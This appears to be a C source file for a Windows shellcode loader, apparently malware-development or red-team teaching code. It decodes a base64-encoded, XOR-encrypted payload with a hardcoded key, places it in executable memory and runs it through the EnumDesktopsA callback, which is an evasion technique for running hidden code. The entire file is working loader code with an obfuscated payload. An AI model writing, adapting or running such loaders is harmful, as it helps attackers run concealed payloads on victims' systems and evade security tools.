#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

int decodeBase64(const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {
  DWORD outLen;
  BOOL fRet;

  outLen = dstLen;
  fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);	
  if (!fRet) outLen = 0;  // failed	
  return(outLen);
}

// key for XOR decrypt
char my_secret_key[] = "mysupersecretkey";

// decrypt deXOR function
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}

int main() {
  DWORD my_payload_len = 313;
  DWORD out_len = 0;

  unsigned char meow_payload[] = "kTHykYCajYyNs3JldCo0OD0rIiM4VKAWLeggBUoj7it1Rzv+IkVMO+4RIls8ZNIzJzRCvDhUst9ZAg5nWEskuKR0MnSxh58hJDJMLf85RUfmO089cbVM+OXrcmV0I+C5GRY7dKA1TPgte0wh/ytFMGypkCk4mrtNJOhG7TxqszRcsDtEsMkzsqxuM2S1U4UMnEc/djxBejZcsgezLFUh8i1dOnSgA0wy7m86WzDgJWUkeKNLMe52+y1ioiQsKj0nNCMyLTE8Mykt4J5FNTmamTU4Ki9OLflhjCqNmos2LL6seXN1cFs6/vB5c2V0VSn06FxydXAtQ7ok2TfmImyarNaZbl96JMjV8N7vmqEj5r1FRXUJeuWJkxBmySJnGQoTbSAy/Kqapz4ADAVIGQ4KDkx5TiteSyxOZQ==";
  unsigned int meow_len = sizeof(meow_payload);
  printf("base64-encoded shellcode:\n%s\n", meow_payload);

  unsigned char exec_mem[my_payload_len];
  decodeBase64((const BYTE *)meow_payload, meow_len, (char *) exec_mem, meow_len);

  printf("xored:\n");
  for (size_t i = 0; i < my_payload_len; i++) {
    printf("\\x%02x", exec_mem[i]);
  }
  printf("\n\n");

  XOR((char *) exec_mem, my_payload_len, my_secret_key, sizeof(my_secret_key));

  for (size_t i = 0; i < my_payload_len; i++) {
    printf("\\x%02x", exec_mem[i]);
  }

  LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, exec_mem, my_payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
  
  return 0;
}
